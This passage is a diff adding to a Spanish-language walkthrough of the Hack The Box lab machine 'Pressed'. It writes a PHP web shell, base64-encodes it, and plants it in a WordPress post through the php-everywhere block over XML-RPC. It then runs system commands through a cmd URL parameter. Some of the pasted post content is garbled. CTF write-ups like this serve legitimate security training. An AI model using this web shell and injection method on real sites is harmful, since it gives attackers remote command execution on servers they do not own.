@@ -281,5 +281,47 @@ post = client.call(posts.GetPosts())
 ### Salida
 `<?php  echo(file_get_contents('/var/www/html/output.log')); ?>`
 
+### Teniendo en cuenta que tenemos un comando de maquina codificado en base64, podemos proceder a crear un comando para interactuar el shell de la siguiente forma
+
+### Creamos un archivo llamado data que contenga el siguiente codigo en php
+
+```
+cat data
+<?php
+    echo "<pre>" . shell_exec($_REQUEST['cmd']). "</prev>";
+?>
+
+```
+
+### Despues de eso con la funcion `base64` procedemos a convertir el contenido del archivo en base64
+`base64 -w 0 data`
+
+### Salida
+`PD9waHAKICAgIGVjaG8gIjxwcmU+IiAuIHNoZWxsX2V4ZWMoJF9SRVFVRVNUWydjbWQnXSkuICI8L3ByZT4iOyAKPz4K`
+
+### Despues con ayuda del script de python debemos crear una nueva variable con la salida del `post.content` modificados el conenido de base64 y despues lo subimos
+
+### Nombramiento de la variable con el contenido.
+
+`>>> malicious_post = post[0]`
+
+### Modificacion de la variable
+
+```malicious_post.content = '<!-- wp:paragraph -->\n<p>The UHC January Finals are underway!  After this event, there are only three left unt one finals in which all the previous winners will compete in the Tournament of Champions. This event a total of eight players qualified, sevre from Brazil and there is one lone Canadian.  Metrics for this event can be found below.</p>\n<!-- /wp:paragraph -->\n\n<!-- wp:php-everywh {"code":"PD9waHAKICAgIGVjaG8gIjxwcmU+IiAuIHNoZWxsX2V4ZWMoJF9SRVFVRVNUWydjbWQnXSkuICI8L3ByZT4iOyAKPz4K","version":"3.0.0"} /-->\n\n<!-- wp:pa<p></p>\n<!-- /wp:paragraph -->\n\n<!-- wp:paragraph -->\n<p></p>\n<!-- /wp:paragraph -->'
+```
+
+### modificacion del post
+
+```
+>>> client.call(posts.EditPost(malicious_post.id,malicious_post))
+True
+
+```
+
+### Despues recargamos la pagina evidenciamos que ya no nos genera el mensaje de consulta, y podemos modificar la url par que no muestre comandos por consola
+
+`http://pressed.htb/index.php/2022/01/28/hello-world/?cmd=whoami`
+
+
 
 
